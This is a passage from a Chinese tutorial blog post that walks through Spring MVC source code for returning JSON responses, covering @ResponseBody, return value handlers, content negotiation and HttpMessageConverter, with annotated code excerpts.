class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br><span class="hljs-comment">&lt;!-- web场景自动引入了json场景 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-json<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.3.4.RELEASE<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>compile<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>控制层代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ResponseTestController</span> &#123;<br>    <br><span class="hljs-meta">@ResponseBody</span>  <span class="hljs-comment">//利用返回值处理器里面的消息转换器进行处理</span><br>    <span class="hljs-meta">@GetMapping(value = &quot;/test/person&quot;)</span><br>    <span class="hljs-keyword">public</span> Person <span class="hljs-title function_">getPerson</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>        person.setAge(<span class="hljs-number">28</span>);<br>        person.setBirth(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>());<br>        person.setUserName(<span class="hljs-string">&quot;zhangsan&quot;</span>);<br>        <span class="hljs-keyword">return</span> person;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><a href="#">32、请求处理-【源码分析】-各种类型参数解析原理 - 返回值处理器</a>有讨论<strong>ReturnValueHandler</strong>。现在直接看看重点：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RequestMappingHandlerAdapter</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractHandlerMethodAdapter</span><br><span class="hljs-keyword">implements</span> <span class="hljs-title class_">BeanFactoryAware</span>, InitializingBean &#123;<br><br>    ...<br>    <br><span class="hljs-meta">@Nullable</span><br><span class="hljs-keyword">protected</span> ModelAndView <span class="hljs-title function_">invokeHandlerMethod</span><span class="hljs-params">(HttpServletRequest request,</span><br><span class="hljs-params">HttpServletResponse response, HandlerMethod handlerMethod)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br><span class="hljs-type">ServletWebRequest</span> <span class="hljs-variable">webRequest</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletWebRequest</span>(request, response);<br><span class="hljs-keyword">try</span> &#123;<br><br>            ...<br>            <br>            <span class="hljs-type">ServletInvocableHandlerMethod</span> <span class="hljs-variable">invocableMethod</span> <span class="hljs-operator">=</span> createInvocableHandlerMethod(handlerMethod);<br>                <br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.argumentResolvers != <span class="hljs-literal">null</span>) &#123;<br>invocableMethod.setHandlerMethodArgumentResolvers(<span class="hljs-built_in">this</span>.argumentResolvers);<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.returnValueHandlers != <span class="hljs-literal">null</span>) &#123;<span class="hljs-comment">//&lt;----关注点</span><br>invocableMethod.setHandlerMethodReturnValueHandlers(<span class="hljs-built_in">this</span>.returnValueHandlers);<br>&#125;<br><br>            ...<br><br>invocableMethod.invokeAndHandle(webRequest, mavContainer);<span class="hljs-comment">//看下块代码</span><br><span class="hljs-keyword">if</span> (asyncManager.isConcurrentHandlingStarted()) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<br><br><span class="hljs-keyword">return</span> getModelAndView(mavContainer, modelFactory, webRequest);<br>&#125;<br><span class="hljs-keyword">finally</span> &#123;<br>webRequest.requestCompleted();<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ServletInvocableHandlerMethod</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">InvocableHandlerMethod</span> &#123;<br>    <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invokeAndHandle</span><span class="hljs-params">(ServletWebRequest webRequest, ModelAndViewContainer mavContainer,</span><br><span class="hljs-params">Object... providedArgs)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br><span class="hljs-type">Object</span> <span class="hljs-variable">returnValue</span> <span class="hljs-operator">=</span> invokeForRequest(webRequest, mavContainer, providedArgs);<br><br>        ...<br>        <br><span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//看下块代码</span><br><span class="hljs-built_in">this</span>.returnValueHandlers.handleReturnValue(<br>returnValue, getReturnValueType(returnValue), mavContainer, webRequest);<br>&#125;<br><span class="hljs-keyword">catch</span> (Exception ex) &#123;<br>...<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HandlerMethodReturnValueHandlerComposite</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HandlerMethodReturnValueHandler</span> &#123;<br>    <br>    ...<br>    <br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleReturnValue</span><span class="hljs-params">(<span class="hljs-meta">@Nullable</span> Object returnValue, MethodParameter returnType,</span><br><span class="hljs-params">ModelAndViewContainer mavContainer, NativeWebRequest webRequest)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-comment">//selectHandler()实现在下面</span><br><span class="hljs-type">HandlerMethodReturnValueHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> selectHandler(returnValue, returnType);<br><span class="hljs-keyword">if</span> (handler == <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;Unknown return value type: &quot;</span> + returnType.getParameterType().getName());<br>&#125;<br>        <span class="hljs-comment">//开始处理</span><br>handler.handleReturnValue(returnValue, returnType, mavContainer, webRequest);<br>&#125;<br>    <br>   <span class="hljs-meta">@Nullable</span><br><span class="hljs-keyword">private</span> HandlerMethodReturnValueHandler <span class="hljs-title function_">selectHandler</span><span class="hljs-params">(<span class="hljs-meta">@Nullable</span> Object value, MethodParameter returnType)</span> &#123;<br><span class="hljs-type">boolean</span> <span class="hljs-variable">isAsyncValue</span> <span class="hljs-operator">=</span> isAsyncReturnValue(value, returnType);<br><span class="hljs-keyword">for</span> (HandlerMethodReturnValueHandler handler : <span class="hljs-built_in">this</span>.returnValueHandlers) &#123;<br><span class="hljs-keyword">if</span> (isAsyncValue &amp;&amp; !(handler <span class="hljs-keyword">instanceof</span> AsyncHandlerMethodReturnValueHandler)) &#123;<br><span class="hljs-keyword">continue</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (handler.supportsReturnType(returnType)) &#123;<br><span class="hljs-keyword">return</span> handler;<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<br>    <br></code></pre></td></tr></table></figure><p><code>@ResponseBody</code> 注解，即<code>RequestResponseBodyMethodProcessor</code>，它实现<code>HandlerMethodReturnValueHandler</code>接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RequestResponseBodyMethodProcessor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractMessageConverterMethodProcessor</span> &#123;<br><br>    ...<br>    <br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleReturnValue</span><span class="hljs-params">(<span class="hljs-meta">@Nullable</span> Object returnValue, MethodParameter returnType,</span><br><span class="hljs-params">ModelAndViewContainer mavContainer, NativeWebRequest webRequest)</span><br><span class="hljs-keyword">throws</span> IOException, HttpMediaTypeNotAcceptableException, HttpMessageNotWritableException &#123;<br><br>mavContainer.setRequestHandled(<span class="hljs-literal">true</span>);<br><span class="hljs-type">ServletServerHttpRequest</span> <span class="hljs-variable">inputMessage</span> <span class="hljs-operator">=</span> createInputMessage(webRequest);<br><span class="hljs-type">ServletServerHttpResponse</span> <span class="hljs-variable">outputMessage</span> <span class="hljs-operator">=</span> createOutputMessage(webRequest);<br><br>        <span class="hljs-comment">// 使用消息转换器进行写出操作，本方法下一章节介绍：</span><br><span class="hljs-comment">// Try even with null return value. ResponseBodyAdvice could get involved.</span><br>writeWithMessageConverters(returnValue, returnType, inputMessage, outputMessage);<br>&#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="38、响应处理-【源码分析】-HTTPMessageConverter原理"><a href="#38、响应处理-【源码分析】-HTTPMessageConverter原理" class="headerlink" title="38、响应处理-【源码分析】-HTTPMessageConverter原理"></a>38、响应处理-【源码分析】-HTTPMessageConverter原理</h2><p>返回值处理器<code>ReturnValueHandler</code>原理：</p><ol><li>返回值处理器判断是否支持这种类型返回值 <code>supportsReturnType</code></li><li>返回值处理器调用 <code>handleReturnValue</code> 进行处理</li><li><code>RequestResponseBodyMethodProcessor</code> 可以处理返回值标了<code>@ResponseBody</code> 注解的。<ul><li>利用 <code>MessageConverters</code> 进行处理 将数据写为json<ol><li>内容协商（浏览器默认会以请求头的方式告诉服务器他能接受什么样的内容类型）</li><li>服务器最终根据自己自身的能力，决定服务器能生产出什么样内容类型的数据，</li><li>SpringMVC会挨个遍历所有容器底层的 <code>HttpMessageConverter</code> ，看谁能处理？<ol><li>得到<code>MappingJackson2HttpMessageConverter</code>可以将对象写为json</li><li>利用<code>MappingJackson2HttpMessageConverter</code>将对象转为json再写出去。</li></ol></li></ol></li></ul></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//RequestResponseBodyMethodProcessor继承这类</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AbstractMessageConverterMethodProcessor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractMessageConverterMethodArgumentResolver</span><br><span class="hljs-keyword">implements</span> <span class="hljs-title class_">HandlerMethodReturnValueHandler</span> &#123;<br><br>    ...<br>    <br>    <span class="hljs-comment">//承接上一节内容</span><br>    <span class="hljs-keyword">protected</span> &lt;T&gt; <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeWithMessageConverters</span><span class="hljs-params">(<span class="hljs-meta">@Nullable</span> T value, MethodParameter returnType,</span><br><span class="hljs-params">                ServletServerHttpRequest inputMessage, ServletServerHttpResponse outputMessage)</span><br>                <span class="hljs-keyword">throws</span> IOException, HttpMediaTypeNotAcceptableException, HttpMessageNotWritableException &#123;<br><br>            Object body;<br>            Class&lt;?&gt; valueType;<br>            Type targetType;<br><br>            <span class="hljs-keyword">if</span> (value <span class="hljs-keyword">instanceof</span> CharSequence) &#123;<br>                body = value.toString();<br>                valueType = String.class;<br>                targetType = String.class;<br>            &#125;<br>            <span class="hljs-keyword">else</span> &#123;<br>                body = value;<br>                valueType = getReturnValueType(body, returnType);<br>                targetType = GenericTypeResolver.resolveType(getGenericType(returnType), returnType.getContainingClass());<br>            &#125;<br><br>...<br><br>            <span class="hljs-comment">//内容协商（浏览器默认会以请求头(参数Accept)的方式告诉服务器他能接受什么样的内容类型）</span><br>            <span class="hljs-type">MediaType</span> <span class="hljs-variable">selectedMediaType</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>            <span class="hljs-type">MediaType</span> <span class="hljs-variable">contentType</span> <span class="hljs-operator">=</span> outputMessage.getHeaders().getContentType();<br>            <span class="hljs-type">boolean</span> <span class="hljs-variable">isContentTypePreset</span> <span class="hljs-operator">=</span> contentType != <span class="hljs-literal">null</span> &amp;&amp; contentType.isConcrete();<br>            <span class="hljs-keyword">if</span> (isContentTypePreset) &#123;<br>                <span class="hljs-keyword">if</span> (logger.isDebugEnabled()) &#123;<br>                    logger.debug(<span class="hljs-string">&quot;Found &#x27;Content-Type:&quot;</span> + contentType + <span class="hljs-string">&quot;&#x27; in response&quot;</span>);<br>                &#125;<br>                selectedMediaType = contentType;<br>            &#125;<br>            <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> inputMessage.getServletRequest();<br>                List&lt;MediaType&gt; acceptableTypes = getAcceptableMediaTypes(request);<br>                <span class="hljs-comment">//服务器最终根据自己自身的能力，决定服务器能生产出什么样内容类型的数据</span><br>                List&lt;MediaType&gt; producibleTypes = getProducibleMediaTypes(request, valueType, targetType);<br><br>                <span class="hljs-keyword">if</span> (body != <span class="hljs-literal">null</span> &amp;&amp; producibleTypes.isEmpty()) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpMessageNotWritableException</span>(<br>                            <span class="hljs-string">&quot;No converter found for return value of type: &quot;</span> + valueType);<br>                &#125;<br>                List&lt;MediaType&gt; mediaTypesToUse = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>                <span class="hljs-keyword">for</span> (MediaType requestedType : acceptableTypes) &#123;<br>                    <span class="hljs-keyword">for</span> (MediaType producibleType : producibleTypes) &#123;<br>                        <span class="hljs-keyword">if</span> (requestedType.isCompatibleWith(producibleType)) &#123;<br>                            mediaTypesToUse.add(getMostSpecificMediaType(requestedType, producibleType));<br>                        &#125;<br>                    &#125;<br>                &#125;<br>                <span class="hljs-keyword">if</span> (mediaTypesToUse.isEmpty()) &#123;<br>                    <span class="hljs-keyword">if</span> (body != <span class="hljs-literal">null</span>) &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpMediaTypeNotAcceptableException</span>(producibleTypes);<br>                    &#125;<br>                    <span class="hljs-keyword">if</span> (logger.isDebugEnabled()) &#123;<br>                        logger.debug(<span class="hljs-string">&quot;No match for &quot;</span> + acceptableTypes + <span class="hljs-string">&quot;, supported: &quot;</span> + producibleTypes);<br>                    &#125;<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br><br>                MediaType.sortBySpecificityAndQuality(mediaTypesToUse);<br><br>                <span class="hljs-comment">//选择一个MediaType</span><br>                <span class="hljs-keyword">for</span> (MediaType mediaType : mediaTypesToUse) &#123;<br>                    <span class="hljs-keyword">if</span> (mediaType.isConcrete()) &#123;<br>                        selectedMediaType = mediaType;<br>                        <span class="hljs-keyword">break</span>;<br>                    &#125;<br>                    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (mediaType.isPresentIn(ALL_APPLICATION_MEDIA_TYPES)) &#123;<br>                        selectedMediaType = MediaType.APPLICATION_OCTET_STREAM;<br>                        <span class="hljs-keyword">break</span>;<br>                    &#125;<br>                &#125;<br><br>                <span class="hljs-keyword">if</span> (logger.isDebugEnabled()) &#123;<br>                    logger.debug(<span class="hljs-string">&quot;Using &#x27;&quot;</span> + selectedMediaType + <span class="hljs-string">&quot;&#x27;, given &quot;</span> +<br>                            acceptableTypes + <span class="hljs-string">&quot; and supported &quot;</span> + producibleTypes);<br>                &#125;<br>            &#125;<br><br>        <br>            <span class="hljs-keyword">if</span> (selectedMediaType != <span class="hljs-literal">null</span>) &#123;<br>                selectedMediaType = selectedMediaType.removeQualityValue();<br>                <span class="hljs-comment">//本节主角：HttpMessageConverter</span><br>                <span class="hljs-keyword">for</span> (HttpMessageConverter&lt;?&gt; converter : <span class="hljs-built_in">this</span>.messageConverters) &#123;<br>                    <span class="hljs-type">GenericHttpMessageConverter</span> <span class="hljs-variable">genericConverter</span> <span class="hljs-operator">=</span> (converter <span class="hljs-keyword">instanceof</span> GenericHttpMessageConverter ?<br>                            (GenericHttpMessageConverter&lt;?&gt;) converter : <span class="hljs-literal">null</span>);<br>                    <br>                    <span class="hljs-comment">//判断是否可写</span><br>                    <span class="hljs-keyword">if</span> (genericConverter != <span class="hljs-literal">null</span> ?<br>                            ((GenericHttpMessageConverter) converter).canWrite(targetType, valueType, selectedMediaType) :<br>                            converter.canWrite(valueType, selectedMediaType)) &#123;<br>                        body = getAdvice().beforeBodyWrite(body, returnType, selectedMediaType,<br>                                (Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpMessageConverter</span>&lt;?&gt;&gt;) converter.getClass(),<br>                                inputMessage, outputMessage);<br>                        <span class="hljs-keyword">if</span> (body != <span class="hljs-literal">null</span>) &#123;<br>                            <span class="hljs-type">Object</span> <span class="hljs-variable">theBody</span> <span class="hljs-operator">=</span> body;<br>                            LogFormatUtils.traceDebug(logger, traceOn -&gt;<br>                                    <span class="hljs-string">&quot;Writing [&quot;</span> + LogFormatUtils.formatValue(theBody, !traceOn) + <span class="hljs-string">&quot;]&quot;</span>);<br>                            addContentDispositionHeader(inputMessage, outputMessage);<br><span class="hljs-comment">//开始写入</span><br>                            <span class="hljs-keyword">if</span> (genericConverter != <span class="hljs-literal">null</span>) &#123;<br>                                genericConverter.write(body, targetType, selectedMediaType, outputMessage);<br>                            &#125;<br>                            <span class="hljs-keyword">else</span> &#123;<br>                                ((HttpMessageConverter) converter).write(body, selectedMediaType, outputMessage);<br>                            &#125;<br>                        &#125;<br>                        <span class="hljs-keyword">else</span> &#123;<br>                            <span class="hljs-keyword">if</span> (logger.isDebugEnabled()) &#123;<br>                                logger.debug(<span class="hljs-string">&quot;Nothing to write: null body&quot;</span>);<br>                            &#125;<br>                        &#125;<br>                        <span class="hljs-keyword">return</span>;<br>                    &#125;<br>                &#125;<br>            &#125;<br>...<br>        &#125;<br></code></pre></td></tr></table></figure><p><code>HTTPMessageConverter</code>接口：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Strategy interface for converting from and to HTTP requests and responses.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">HttpMessageConverter</span>&lt;T&gt; &#123;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Indicates whether the given class can be read by this converter.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">boolean</span> <span class="hljs-title function_">canRead</span><span class="hljs-params">(Class&lt;?&gt; clazz, <span class="hljs-meta">@Nullable</span> MediaType mediaType)</span>;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Indicates whether the given class can be written by this converter.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">boolean</span> <span class="hljs-title function_">canWrite</span><span class="hljs-params">(Class&lt;?&gt; clazz, <span class="hljs-meta">@Nullable</span> MediaType mediaType)</span>;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Return the list of &#123;<span class="hljs-doctag">@link</span> MediaType&#125; objects supported by this converter.</span><br><span class="hljs-comment"> */</span><br>List&lt;MediaType&gt; <span class="hljs-title function_">getSupportedMediaTypes</span><span class="hljs-params">()</span>;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Read an object of the given type from the given input message, and returns it.</span><br><span class="hljs-comment"> */</span><br>T <span class="hljs-title function_">read</span><span class="hljs-params">(Class&lt;? extends T&gt; clazz, HttpInputMessage inputMessage)</span><br><span class="hljs-keyword">throws</span> IOException, HttpMessageNotReadableException;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Write an given object to the given output message.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">void</span> <span class="hljs-title function_">write</span><span class="hljs-params">(T t, <span class="hljs-meta">@Nullable</span> MediaType contentType, HttpOutputMessage outputMessage)</span><br><span class="hljs-keyword">throws</span> IOException, HttpMessageNotWritableException;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p><code>HttpMessageConverter</code>: 看是否支持将 此 <code>Class</code>类型的对象，转为<code>MediaType</code>类型的数据。</p><p>例子：<code>Person</code>对象转为JSON，或者 JSON转为<code>Person</code>，这将用到<code>MappingJackson2HttpMessageConverter</code></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210205010509984.png" alt="在这里插入图片描述"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MappingJackson2HttpMessageConverter</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractJackson2HttpMessageConverter</span> &#123;<br>...<br>&#125;<br></code></pre></td></tr></table></figure><p>关于<code>MappingJackson2HttpMessageConverter</code>的实例化请看下节。</p><h3 id="关于HttpMessageConverters的初始化"><a href="#关于HttpMessageConverters的初始化" class="headerlink" title="关于HttpMessageConverters的初始化"></a>关于HttpMessageConverters的初始化</h3><p><code>DispatcherServlet</code>的初始化时会调用<code>initHandlerAdapters(ApplicationContext context)</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DispatcherServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">FrameworkServlet</span> &#123;<br>    <br>    ...<br>    <br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">initHandlerAdapters</span><span class="hljs-params">(ApplicationContext context)</span> &#123;<br><span class="hljs-built_in">this</span>.handlerAdapters = <span class="hljs-literal">null</span>;<br><br><span 